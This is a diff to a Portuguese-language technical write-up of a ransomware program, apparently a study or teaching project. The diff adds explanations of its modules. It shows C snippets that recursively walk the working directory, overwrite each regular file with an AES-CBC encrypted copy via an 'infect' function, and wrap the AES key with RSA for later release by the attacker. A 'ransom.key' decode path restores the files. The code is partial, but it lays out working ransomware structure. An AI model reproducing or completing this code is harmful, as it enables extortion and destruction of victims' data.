@@ -16,7 +16,7 @@ O binário gerado pelo projeto realiza operações de criptografia e descriptogr
 
 ## 3. Seleção de Arquivos
 
-A seleção dos arquivos é realizada pela função `walk`, definida em `FileHandler.c`. Apenas arquivos regulares são processados, utilizando a função `stat` e o macro `S_ISREG`. Diretórios, arquivos ocultos (prefixados por ".") e outros tipos de entrada são descartados:
+A seleção dos arquivos é realizada pela função `walk`, definida em `FileHandler.c`. Apenas arquivos regulares são processados, utilizando a função `stat` e o macro `S_ISREG`. Diretórios, arquivos ocultos (prefixados por ".") e outros tipos de entrada são descartados. O trecho abaixo demonstra a filtragem de arquivos:
 
 ```c
 if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
@@ -25,6 +25,13 @@ if (stat(path, &info) == 0 && S_ISREG(info.st_mode)) {
     else
         clean(path, rsa);
 }
+```
+
+A verificação `S_ISREG` assegura que apenas arquivos regulares sejam processados. Além disso, o código ignora arquivos com nomes iniciados por `"."`:
+
+```c
+if (entry->d_name[0] == '.')
+    continue;
 ```
 
 ## 4. Arquitetura Modular
@@ -55,7 +62,7 @@ src/
 
 ### 5.1. `main.c`
 
-Realiza o parsing de argumentos com `getopt_long`, definindo a operação:
+Este arquivo é o ponto de entrada do programa. Ele interpreta os argumentos de linha de comando utilizando `getopt_long` e direciona o fluxo para as funções apropriadas.
 
 ```c
 static struct option long_options[] = {
@@ -66,7 +73,7 @@ static struct option long_options[] = {
 };
 ```
 
-Fluxo principal:
+Dependendo da flag escolhida, o programa chama a função `walk`, que percorre os arquivos e aplica a operação desejada. A criptografia ou descriptografia das chaves AES é feita após o processo de arquivo, via `RSA_encrypt` ou `RSA_decrypt`:
 
 ```c
 switch (opt) {
@@ -76,6 +83,10 @@ switch (opt) {
         break;
     case 'd':
         rsa = fopen("ransom.key", "rb");
+        if (!rsa) {
+            perror("Erro ao abrir chave privada");
+            exit(EXIT_FAILURE);
+        }
         walk(0, rsa);
         RSA_decrypt(rsa);
         break;
@@ -87,9 +98,11 @@ switch (opt) {
 
 ### 5.2. `FileHandler.c`
 
+Este módulo agrupa as funções responsáveis pela manipulação dos arquivos no sistema de diretórios.
+
 #### Função `walk`
 
-Percorre recursivamente os arquivos do diretório de execução:
+Percorre recursivamente todos os arquivos do diretório onde o programa foi executado. Para cada arquivo encontrado, chama a função adequada: `infect` (criptografar) ou `clean` (descriptografar), dependendo da operação selecionada.
 
 ```c
 void walk(int encrypt, FILE *rsa) {
@@ -114,13 +127,21 @@ void walk(int encrypt, FILE *rsa) {
 }
 ```
 
-#### Funções `infect` e `clean`
+#### Função `infect`
+
+Criptografa um arquivo usando AES e, ao final, prepara a chave AES para ser criptografada com RSA. Cada arquivo é sobrescrito com sua versão criptografada.
 
 ```c
 void infect(char *filename) {
     encryptFile(filename, "keys/AES.key");
 }
+```
 
+#### Função `clean`
+
+Faz o processo inverso da `infect`. Recebe a chave privada RSA, descriptografa a chave AES previamente salva e utiliza-a para restaurar os arquivos criptografados ao seu estado original.
+
+```c
 void clean(char *filename, FILE *rsa) {
     decryptFile(filename, "keys/AES.key");
 }
@@ -128,7 +149,11 @@ void clean(char *filename, FILE *rsa) {
 
 ### 5.3. `AES.c`
 
-#### `encryptFile`
+Este arquivo contém as rotinas de criptografia e descriptografia com **AES (Advanced Encryption Standard)**.
+
+#### Função `encryptFile`
+
+Criptografa o conteúdo de um arquivo usando AES no modo CBC. Um IV (vetor de inicialização) aleatório é utilizado para aumentar a segurança. O resultado substitui o conteúdo original do arquivo.
 
 ```c
 void encryptFile(const char *filename, const char *keyfile) {
@@ -155,7 +180,9 @@ void encryptFile(const char *filename, const char *keyfile) {
 }
 ```
 
-#### `decryptFile`
+#### Função `decryptFile`
+
+Descriptografa o conteúdo de um arquivo criptografado com AES, restaurando seu conteúdo original. A operação depende da chave AES correta e do IV usado na criptografia.
 
 ```c
 void decryptFile(const char *filename, const char *keyfile) {
@@ -184,7 +211,11 @@ void decryptFile(const char *filename, const char *keyfile) {
 
 ### 5.4. `RSA.c`
 
-#### `RSA_encrypt`
+Implementa a criptografia assimétrica **RSA**, usada exclusivamente para proteger a chave AES.
+
+#### Função `RSA_encrypt`
+
+Criptografa a chave AES com uma chave pública RSA. Essa chave criptografada pode ser armazenada com segurança ou transmitida ao atacante.
 
 ```c
 void RSA_encrypt() {
@@ -201,7 +232,9 @@ void RSA_encrypt() {
 }
 ```
 
-#### `RSA_decrypt`
+#### Função `RSA_decrypt`
+
+Recebe uma chave privada RSA e a utiliza para descriptografar a chave AES. Essa operação é crítica para permitir que os arquivos criptografados possam ser recuperados no modo `--decode`.
 
 ```c
 void RSA_decrypt(FILE *rsaFile) {
